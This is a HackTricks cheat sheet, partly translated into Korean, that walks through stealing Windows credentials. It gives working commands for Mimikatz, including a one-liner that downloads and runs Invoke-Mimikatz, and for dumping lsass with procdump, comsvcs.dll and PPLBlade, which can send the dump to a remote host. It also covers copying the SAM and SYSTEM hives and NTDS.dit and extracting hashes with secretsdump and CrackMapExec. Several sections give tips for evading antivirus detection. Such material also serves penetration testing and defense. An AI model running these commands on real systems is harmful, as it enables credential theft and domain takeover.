# Stealing Windows Credentials

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Credentials Mimikatz

## 자격 증명 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz로 할 수 있는 다른 작업은** [**이 페이지**](credentials-mimikatz.md)**에서 찾을 수 있습니다.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**여기에서 몇 가지 가능한 자격 증명 보호에 대해 알아보세요.**](credentials-protections.md) **이 보호는 Mimikatz가 일부 자격 증명을 추출하는 것을 방지할 수 있습니다.**

## Meterpreter로 자격 증명

피해자 내부에서 **비밀번호와 해시를 검색하기 위해** 내가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하세요.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV 우회

### Procdump + Mimikatz

**SysInternals의 Procdump**은 [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)의 **합법적인 Microsoft 도구**이기 때문에 Defender에 의해 탐지되지 않습니다.\
이 도구를 사용하여 **lsass 프로세스를 덤프**하고, **덤프를 다운로드**한 후 **로컬에서 자격 증명을 추출**할 수 있습니다.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

이 과정은 [SprayKatz](https://github.com/aas-n/spraykatz)를 사용하여 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**참고**: 일부 **AV**는 **procdump.exe를 사용하여 lsass.exe를 덤프**하는 것을 **악성**으로 **감지**할 수 있습니다. 이는 **"procdump.exe"와 "lsass.exe"** 문자열을 **감지**하기 때문입니다. 따라서 **lsass.exe의 이름** 대신 **PID**를 procdump에 **인수**로 **전달**하는 것이 **더 은밀**합니다.

### **comsvcs.dll**을 사용하여 lsass 덤프

`C:\Windows\System32`에 있는 **comsvcs.dll**이라는 DLL은 **충돌 시 프로세스 메모리를 덤프**하는 역할을 합니다. 이 DLL에는 `rundll32.exe`를 사용하여 호출할 수 있는 **`MiniDumpW`**라는 **함수**가 포함되어 있습니다.\
첫 두 인수를 사용하는 것은 중요하지 않지만, 세 번째 인수는 세 가지 구성 요소로 나뉩니다. 덤프할 프로세스 ID가 첫 번째 구성 요소를 이루고, 덤프 파일 위치가 두 번째를 나타내며, 세 번째 구성 요소는 **full**이라는 단어입니다. 다른 옵션은 없습니다.\
이 세 가지 구성 요소를 구문 분석하면, DLL은 덤프 파일을 생성하고 지정된 프로세스의 메모리를 이 파일로 전송합니다.\
**comsvcs.dll**을 사용하여 lsass 프로세스를 덤프하는 것이 가능하며, 이를 통해 procdump를 업로드하고 실행할 필요가 없습니다. 이 방법은 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)에서 자세히 설명되어 있습니다.

다음 명령어가 실행에 사용됩니다:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**이 과정을 자동화하려면** [**lssasy**](https://github.com/Hackndo/lsassy)**를 사용할 수 있습니다.**

### **Task Manager로 lsass 덤프하기**

1. 작업 표시줄을 마우스 오른쪽 버튼으로 클릭하고 작업 관리자를 클릭합니다.
2. 자세히 보기를 클릭합니다.
3. 프로세스 탭에서 "Local Security Authority Process" 프로세스를 찾습니다.
4. "Local Security Authority Process" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "덤프 파일 생성"을 클릭합니다.

### procdump으로 lsass 덤프하기

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)는 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 스위트의 일부인 Microsoft 서명 바이너리입니다.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)는 메모리 덤프를 난독화하고 디스크에 저장하지 않고 원격 워크스테이션으로 전송할 수 있는 Protected Process Dumper Tool입니다.

**주요 기능**:

1. PPL 보호 우회
2. Defender의 시그니처 기반 탐지 메커니즘을 피하기 위해 메모리 덤프 파일 난독화
3. 디스크에 저장하지 않고 RAW 및 SMB 업로드 방법으로 메모리 덤프 업로드 (파일리스 덤프)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes

SAM 해시 덤프하기
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets 덤프

### Dumping LSA secrets with mimikatz

mimikatz를 사용하여 LSA secrets를 덤프하는 방법은 다음과 같습니다:

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::secrets
```

### Dumping LSA secrets with secretsdump.py

secretsdump.py를 사용하여 LSA secrets를 덤프하는 방법은 다음과 같습니다:

```
secretsdump.py -just-dc-ntlm <domain>/<username>@<dc_ip>
```

### Dumping LSA secrets with CrackMapExec

CrackMapExec를 사용하여 LSA secrets를 덤프하는 방법은 다음과 같습니다:

```
cme smb <target_ip> -u <username> -p <password> --lsa
```
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 대상 DC에서 NTDS.dit 덤프하기
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 대상 DC에서 NTDS.dit 비밀번호 기록 덤프하기
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 각 NTDS.dit 계정에 대한 pwdLastSet 속성 표시

```powershell
$domain = "yourdomain.com"
$creds = Get-Credential
$Session = New-PSSession -ComputerName "yourdomaincontroller" -Credential $creds
Invoke-Command -Session $Session -ScriptBlock {
    Import-Module ActiveDirectory
    Get-ADUser -Filter * -Property pwdLastSet | Select-Object Name, pwdLastSet
}
```
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

이 파일들은 _C:\windows\system32\config\SAM_ 및 _C:\windows\system32\config\SYSTEM_에 **위치**해야 합니다. 하지만 **일반적인 방법으로는 복사할 수 없습니다**. 왜냐하면 이 파일들은 보호되어 있기 때문입니다.

### From Registry

이 파일들을 훔치는 가장 쉬운 방법은 레지스트리에서 복사본을 얻는 것입니다:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** those files to your Kali machine and **extract the hashes** using:

```bash
# 명령어 예시
```
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

이 서비스를 사용하여 보호된 파일을 복사할 수 있습니다. 관리자 권한이 필요합니다.

#### vssadmin 사용하기

vssadmin 바이너리는 Windows Server 버전에서만 사용할 수 있습니다.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
하지만 **Powershell**에서도 동일하게 할 수 있습니다. 이것은 **SAM 파일을 복사하는 방법**의 예입니다 (사용된 하드 드라이브는 "C:"이고 C:\users\Public에 저장됨) 하지만 이 방법을 사용하여 보호된 파일을 복사할 수 있습니다:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

마지막으로, SAM, SYSTEM 및 ntds.dit의 복사본을 만들기 위해 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)를 사용할 수도 있습니다.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** 파일은 **Active Directory**의 핵심으로, 사용자 객체, 그룹 및 그들의 멤버십에 대한 중요한 데이터를 보유하고 있습니다. 이 파일은 도메인 사용자의 **비밀번호 해시**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치해 있습니다.

이 데이터베이스 내에는 세 가지 주요 테이블이 유지됩니다:

- **Data Table**: 이 테이블은 사용자 및 그룹과 같은 객체에 대한 세부 정보를 저장하는 역할을 합니다.
- **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
- **SD Table**: 각 객체에 대한 **보안 설명자**가 여기에 저장되어, 저장된 객체의 보안 및 접근 제어를 보장합니다.

더 많은 정보는 여기에서 확인할 수 있습니다: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows는 _Ntdsa.dll_을 사용하여 해당 파일과 상호 작용하며, 이는 _lsass.exe_에 의해 사용됩니다. 따라서, **NTDS.dit** 파일의 **일부**는 **`lsass`** 메모리 내에 위치할 수 있습니다 (성능 향상을 위해 **캐시**를 사용하여 최근에 접근한 데이터를 찾을 수 있습니다).

#### NTDS.dit 내부의 해시 복호화

해시는 3번 암호화됩니다:

1. **BOOTKEY**와 **RC4**를 사용하여 비밀번호 암호화 키(**PEK**) 복호화.
2. **PEK**와 **RC4**를 사용하여 **해시** 복호화.
3. **DES**를 사용하여 **해시** 복호화.

**PEK**는 **모든 도메인 컨트롤러**에서 **동일한 값**을 가지지만, **도메인 컨트롤러의 SYSTEM 파일 (도메인 컨트롤러마다 다름)**의 **BOOTKEY**를 사용하여 **NTDS.dit** 파일 내에서 **암호화**됩니다. 따라서 NTDS.dit 파일에서 자격 증명을 얻으려면 **NTDS.dit 및 SYSTEM 파일**이 필요합니다 (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil을 사용하여 NTDS.dit 복사

Windows Server 2008부터 사용 가능.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**볼륨 섀도우 복사본**](./#stealing-sam-and-system) 트릭을 사용하여 **ntds.dit** 파일을 복사할 수도 있습니다. **SYSTEM 파일**의 복사본도 필요하다는 것을 기억하세요 (다시 한 번, [**레지스트리에서 덤프하거나 볼륨 섀도우 복사본**](./#stealing-sam-and-system) 트릭을 사용하세요).

### **NTDS.dit에서 해시 추출하기**

**NTDS.dit** 및 **SYSTEM** 파일을 **획득**한 후 _secretsdump.py_와 같은 도구를 사용하여 **해시를 추출**할 수 있습니다:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
당신은 또한 유효한 도메인 관리자 사용자를 사용하여 **자동으로 추출**할 수 있습니다:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**큰 NTDS.dit 파일**의 경우 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용하여 추출하는 것이 좋습니다.

마지막으로, **metasploit 모듈**: _post/windows/gather/credentials/domain\_hashdump_ 또는 **mimikatz** `lsadump::lsa /inject`를 사용할 수도 있습니다.

### **NTDS.dit에서 SQLite 데이터베이스로 도메인 객체 추출**

NTDS 객체는 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하여 SQLite 데이터베이스로 추출할 수 있습니다. 비밀 정보뿐만 아니라 전체 객체와 속성도 추출되어, 원시 NTDS.dit 파일이 이미 검색된 경우 추가 정보 추출이 가능합니다.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive는 선택 사항이지만 비밀 해독을 허용합니다 (NT & LM 해시, 평문 비밀번호와 같은 보충 자격 증명, kerberos 또는 신뢰 키, NT & LM 비밀번호 기록). 다른 정보와 함께 다음 데이터가 추출됩니다: 사용자 및 기계 계정과 그 해시, UAC 플래그, 마지막 로그인 및 비밀번호 변경에 대한 타임스탬프, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, 조직 단위 트리 및 멤버십, 신뢰 유형, 방향 및 속성이 있는 신뢰 도메인...

## Lazagne

[여기](https://github.com/AlessandroZ/LaZagne/releases)에서 바이너리를 다운로드하십시오. 이 바이너리를 사용하여 여러 소프트웨어에서 자격 증명을 추출할 수 있습니다.
```
lazagne.exe all
```
## SAM 및 LSASS에서 자격 증명을 추출하기 위한 기타 도구

### Windows credentials Editor (WCE)

이 도구는 메모리에서 자격 증명을 추출하는 데 사용할 수 있습니다. 다운로드 링크: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 자격 증명을 추출합니다.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM 파일에서 자격 증명 추출
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7)에서 다운로드하고 **실행**하면 비밀번호가 추출됩니다.

## Defenses

[**여기에서 자격 증명 보호에 대해 알아보세요.**](credentials-protections.md)

<details>

<summary><strong>제로부터 히어로까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법들:

* **회사를 HackTricks에 광고**하거나 **HackTricks를 PDF로 다운로드**하려면 [**구독 플랜**](https://github.com/sponsors/carlospolop)을 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com) 받기
* 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family) 발견하기
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**telegram 그룹**](https://t.me/peass)에 가입**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
* **PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 **해킹 트릭을 공유하세요.**

</details>
